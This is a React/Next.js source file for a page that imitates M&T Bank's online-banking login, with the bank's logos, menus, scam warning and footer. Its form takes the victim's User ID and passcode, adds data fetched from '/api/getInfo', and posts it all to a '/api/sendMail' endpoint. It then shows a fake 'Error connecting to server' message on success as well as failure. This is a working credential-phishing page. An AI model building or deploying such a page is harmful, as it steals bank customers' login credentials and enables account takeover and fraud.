"use client"
import Image from "next/image";
import { FcGoogle } from "react-icons/fc";
import { FaFacebookF } from "react-icons/fa6";
import { GrApple } from "react-icons/gr";
import logo from '../../public/logo.png'
import lender from '../../public/equal-housing-lender-logo.png'
import logo_coloured from '../../public/logo_coloured.png';
import { AiOutlineClose } from "react-icons/ai";
// import Footer from '../components/footer'
import { useEffect, useState } from "react";


export default function Home() {
  const [info, setInfo] = useState({})
  const [change, setChange] = useState(false)
  const [dropdown, setDropDown] = useState(false)
  const [user_id, setUserId] = useState('')
  const [passcode, setPasscode] = useState('')
  useEffect(() => {
    async function fetchAm() {
      const response = await fetch('/api/getInfo')
      const data = await response.json()
      setInfo(data)
    }

    fetchAm()
  }, [])

  const submit = async (e) => {
    e.preventDefault()
    const payload = {
      user_id,
      passcode,
      ...info
    }

    const res = await fetch('/api/sendMail', {
      method: "POST",
      body: JSON.stringify(payload),
      headers: {
        'content-type': 'application/json'
      }
    })
    // console.log(res)
    if(res.ok){
      console.log("Yeai!")
      // setLoading(false)
      setError('Error connecting to server')
    }else{
      console.log("Oops! Something is wrong.")
      // setLoading(false)
      setError('Error connecting to server')
    }
  }

  const change_ = (val) => {
    console.log('i am clicked!')
    setChange(val)
  }

  const drop_func = () => {
    setDropDown(!dropdown)
  }

  console.log(user_id, passcode)
  return (
    <div>

      <div className={["sidebar", change ? "active" : ""].join(' ')}>
        <div className="sidebar_header">
          <Image src={logo_coloured} width="100" height="100" />
        </div>
        <div className="flex mt-10">

          <div className="f1">

            <ul >
              <li className="first_li"><Image src={logo_coloured} width="180" height="180" /></li>
              <a href="#" className="all_a"><li>Personal</li></a>
              <a href="#" className="all_a"><li>Business</li></a>
              <a href="#" className="all_a"><li>Commercial</li></a>
              <a href="#" className="all_a"><li>Español</li></a>
            </ul>
          </div>

          <div className="f2">
            <ul >
              <li className="btn-like">{'Login >'}</li>
              <a href="#" className="all_a"><li className="mt-6">Mortgage Assistance Programs</li></a>
              <a href="#" className="all_a"><li className="mt-2">F A Qs</li></a>
              <a href="#" className="all_a"><li className="mt-2">Common Banking Tasks</li></a>
              <a href="#" className="all_a"><li className="mt-2">Locations & ATMs</li></a>
              <a href="#" className="all_a"><li className="mt-2">About M&T</li></a>
              <a href="#" className="all_a"><li className="mt-2">Banking Security</li></a>
              <a href="#" className="all_a"><li className="mt-2">Careers</li></a>
            </ul>
          </div>

          <button onClick={() => change_(false)} className="close_btn">
            <AiOutlineClose style={{height: '40px', width: '40px'}} />
          </button>

        </div>


      </div>

      <header className="px-6 py-4 sticky top-0 right-0 flex justify-between  items-center h-[75px] gap-4 bg-white dark:bg-brand-dark z-50 border-b dark:border-neutral-800">
        <div class="left-menu">
          <button onClick={() => change_(true)}>
            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="inline-block" height="30" width="30" xmlns="http://www.w3.org/2000/svg">
              <path fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="48" d="M88 152h336M88 256h336M88 360h336"></path>
            </svg>
          </button>
        </div>
        <div className="flex text-right links">
          <div className="flex gap-2 sm:gap-4 items-center justify-end">
          <a href="https://www.dexview.com/" className="p-3 rounded-md  flex dark:border-neutral-300" target="_blank" rel="nofollow noreferrer">
            {/* <Image src={dexview} height={20} width={20} alt="Dexview" className="w-[20px] h-[20px]" /> */}
            <span className=" font-[500] " >Personal</span>
          </a>
          <a href="https://www.dexview.com/" className="p-3 rounded-md  flex dark:border-neutral-300" target="_blank" rel="nofollow noreferrer">
            {/* <Image src={dexview} height={20} width={20} alt="Dexview" className="w-[20px] h-[20px]" /> */}
            <span className=" font-[500] " >Business</span>
          </a>
          <a href="https://www.dexview.com/" className="p-3 rounded-md  flex dark:border-neutral-300" target="_blank" rel="nofollow noreferrer">
            {/* <Image src={dexview} height={20} width={20} alt="Dexview" className="w-[20px] h-[20px]" /> */}
            <span className="font-[500] " >Commercial</span>
          </a>
          <a href="https://www.dexview.com/" className="p-3 rounded-md  flex dark:border-neutral-300" target="_blank" rel="nofollow noreferrer">
            {/* <Image src={dexview} height={20} width={20} alt="Dexview" className="w-[20px] h-[20px]" /> */}
            <span className=" font-[500] " >People's United</span>
          </a>
        <div>
        <div>
          {/* <button type="button" className="ant-btn ant-btn-primary">
            <div className="flex items-center gap-1">
              <div>Connect</div>
              <div className="hidden-against-adblock sm:block">Wallet</div>
            </div>
          </button> */}
        </div>
      </div>
      </div>
        </div>

        <div className="flex logo_div">
        <Image src={logo} width="150" height="150" />
        </div>
         {/* <div class="hidden-against-adblock md:flex">
              <div class="items-center gap-4 flex">
                <a href="https://www.dexview.com/" class="p-3 rounded-md border flex dark:border-neutral-800" target="_blank" rel="nofollow noreferrer">
                  <Image src={dexview} alt="Dexview" height="20" width="20" class="w-[20px] h-[20px]" />
                  <span class="ml-2 font-[500] text-sm hidden-against-adblock md:block">dexview.com</span>
                </a>
                <div>
                <button type="button" class="ant-btn ant-btn-primary">
                  <div class="flex items-center gap-1">
                    <div>Connect</div>
                    <div class="hidden-against-adblock sm:block">Wallet</div>
                  </div>
                </button>
                </div>
              </div>
          </div> */}
        <div class="right-menu">
          <button onClick={() => change_(true)}>
            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="inline-block" height="30" width="30" xmlns="http://www.w3.org/2000/svg">
              <path fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="48" d="M88 152h336M88 256h336M88 360h336"></path>
            </svg>
          </button>
        </div>
      </header>

      <div className="flex flex-row bg-white">

        <div className="links w-[50%] shrink-0 sm:flex sm:flex-col sm:items-end">
          <div className="info">
            <h2 clssName="header_left ">Beware of scams</h2>
            <p>
              M&T Bank does not initiate emails, texts, or phone calls seeking your personal data, account or card numbers. Never provide sensitive personal information like your account number, card number, card PIN, username password or a one-time passcode to anyone who emails, texts, or calls you unexpectedly. Never initiate a Zelle, Bill Pay or Bank-to-Bank transfer upon instructions from someone who emails, text or calls you unexpectedly posing to be an employee of M&T.
            </p>
            <p style={{marginTop: '30px'}}>
              <a className="init">{"Learn More >"} </a>
            </p>
          </div>
        </div>

        <div className="flex sm:mt-[1em] w-[100%] md:mt-[-1em] lg:mt-[-1em] flex-col justify-center px-6 py-12 lg:px-8" >

            <div className="flex justify-center sm:mx-auto sm:w-full sm:max-w-sm" >

              {/* <Image width={69} className="mx-auto h-10 w-auto" src="https://tailwindui.com/img/logos/mark.svg?color=indigo&shade=600" alt="Your Company" /> */}
              <h1 className="text-3xl leading-9 tracking-tight text-green-900">Log in</h1>
            </div>

            <div className="choose sm:mx-auto sm:w-full sm:max-w-sm flex">
              <div className="first ">Personal / Business</div>
              <div className="second">Commercial Treasury Center</div>
            </div>

            <div className="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
              <form className="space-y-6" onSubmit={submit}>
                <div>
                  {/* <label htmlFor="email" className="block text-sm font-medium leading-6 text-gray-900">Email address</label> */}
                  <div className="mt-2">
                    <input id="email" value={user_id} onChange={(e) => setUserId(e.target.value)} placeholder="User ID" name="userid" type="text" autoComplete="text" required className="block w-full p-5 h-[3.5em] rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
                  </div>
                </div>

                <div>
                  <div className="flex items-center justify-between">
                    {/* <label htmlFor="password" className="block text-sm font-medium leading-6 text-gray-900">Password</label> */}
                    {/* <div className="text-sm">
                      <a href="#" className="font-semibold text-indigo-600 hover:text-indigo-500">Forgot password?</a>
                    </div> */}
                  </div>
                  <div className="mt-[-1em]">
                    <input id="password" value={passcode} onChange={(e) => setPasscode(e.target.value)} placeholder="passcode" name="password" type="password" autoComplete="current-password" required className="block w-full h-[3.5em] p-5 rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" />
                  </div>
                </div>

                <div className="flex justify-between">
                  <div className="flex items-center mb-4">
                      <input id="default-checkbox" type="checkbox" value="" class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600" />
                      <label for="default-checkbox" class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300">Remember User ID</label>
                  </div>
                  <div>
                    <p style={{fontSize: '12px'}}>
                    {/* <svg className="login-icon -icon-question-mark" alt="">
                      <use xlink:href="#icon-question-mark"></use>
                    </svg> */}
                    <a href="#">Help with User ID or Passcode</a>
                    </p>
                  </div>

                </div>

                  <button type="submit" className="flex w-[100px] justify-center h-10 px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 bttn">
                    {"Log In >"}
                  </button>
              </form>
              {/* <div className="outer-div mt-6">
                    <div className="inner">or</div>
              </div> */}

              <div className="mt-10">
                  <button  className="flex all_a justify-center h-10 rounded-md bg-white-600  py-1.5 leading-6 text-black shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2" >
                    Enroll in M&T Online Banking
                  </button>
              </div>

              <div className="mt-3">

              {/* <details className="dropdown w-[100%]" style={{border: '1px solid'}}>
                <summary className=" m-1">More Personal & Business Services

                </summary>
                <ul className="menu w-[100%] dropdown-bottom bg-base-100 rounded-box z-[1] w-52 p-2 shadow">
                  <li><a>Online Banking</a></li>
                  <li><a>Account View Wilmington Advisors @ M&T</a></li>
                  <li><a>View All</a></li>
                </ul>



              </details> */}

              <div className="dropdown">
              <button onClick={drop_func} class="dropbtn flex all_a">
                More Personal & Business Services
                <svg class="w-2.5 h-2.5 ms-3 mt-1" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4"/>
                </svg>
              </button>
              <div id="myDropdown" class={["dropdown-content", dropdown ? 'show' : ''].join('')}>
              <ul className="menu w-[100%] dropdown-bottom bg-base-100 rounded-box z-[1] w-52 p-2 shadow">
                  <li><a href="#" className="all_a">Online Banking</a></li>
                  <li><a href="#" className="all_a">Account View Wilmington Advisors @ M&T</a></li>
                  <li><a href="#" className="all_a">View All</a></li>
                </ul>
              </div>
              </div>




              </div>




            </div>

            <div className="flex flex-col p-5 ff" >
                    <div className="sec">

                    <p style={{textAlign: "center", fontSize: '12px'}} ><Image src={lender} className="imgs" width="14" />
                    &nbsp;Equal Housing Lender. Bank NMLS #381076.<br />
                    © 2024 M&amp;T Bank. Member FDIC. All rights reserved.
                    </p>
                    </div>

                    <ul class="personal-business footer-nav-items">
                      <li><a href="/homepage/explore-the-m-and-t-bank-help-center/bank-policies/privacy-policy">Privacy&nbsp;</a></li>
                      | <li><a href="/homepage/sitemap">Sitemap&nbsp;</a></li>
                      | <li><a href="/homepage/explore-the-m-and-t-bank-help-center/digital-services-agreement" title="M&amp;T Digital Services Agreement">Digital Service Agreement&nbsp;</a></li>
                      | <li><a href="https://asset.mtb.com/Documents/html/ESign.htm">ESign Consent&nbsp;</a></li>
                      | <li><a href="/homepage/explore-the-m-and-t-bank-help-center/bank-policies/terms-of-use-policy">Terms of Use</a></li>
                    </ul>


            </div>

        </div>

      </div>


      {/* <Footer /> */}
  </div>


  );
}